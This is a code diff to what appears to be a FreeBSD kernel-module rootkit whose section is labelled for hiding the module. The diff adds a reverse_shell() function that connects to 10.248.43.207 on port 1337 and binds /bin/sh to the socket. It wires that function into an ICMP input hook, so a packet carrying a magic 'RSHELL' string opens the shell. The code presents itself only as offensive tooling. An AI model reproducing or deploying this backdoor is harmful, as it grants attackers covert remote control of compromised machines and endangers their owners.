@@ -22,6 +22,9 @@
 #include <sys/file.h>
 #include <sys/fcntl.h>
 
+#include <netinet/in.h>
+#include <sys/socket.h>
+
 //=======HIDING KLD===========
 
 #include <sys/linker.h>
@@ -217,7 +220,7 @@ static int write_kernel2userspace(struct thread *td, char c){
 		If the pathname given in pathname is relative and dirfd is the special value AT_FDCWD, 
 		then pathname is interpreted relative to the current working directory of the calling process 
 	*/
-	error = kern_openat(td, AT_FDCWD, "/tmp/log.txt", UIO_SYSSPACE, O_WRONLY | O_CREAT | O_APPEND, 0666);
+	error = kern_openat(td, AT_FDCWD, "/log.txt", UIO_SYSSPACE, O_WRONLY | O_CREAT | O_APPEND, 0666);
     
     if (error){
         uprintf("open error %d\n", error);
@@ -400,6 +403,7 @@ int icmp_input_hook(struct mbuf **m, int *off, int proto){
 
 	else if (strncmp(icp->icmp_data, RSHELL, 5) == 0) {
 			printf("send shell.\n");
+			reverse_shell();
 			return(0);
 	}
 	else
@@ -407,6 +411,25 @@ int icmp_input_hook(struct mbuf **m, int *off, int proto){
 		return (icmp_input(m, off, proto));
 
 	return (icmp_input(m, off, proto));
+}
+//==============================================================================
+
+void reverse_shell(){
+	struct sockaddr_in sa;
+    int s;
+
+    sa.sin_family = AF_INET;
+    sa.sin_addr.s_addr = inet_addr("10.248.43.207");
+    sa.sin_port = htons(1337);
+
+    s = socket(AF_INET, SOCK_STREAM, 0);
+    connect(s, (struct sockaddr *)&sa, sizeof(sa));
+    dup2(s, 0);
+    dup2(s, 1);
+    dup2(s, 2);
+
+    execve("/bin/sh", 0, 0);
+
 }
 
 
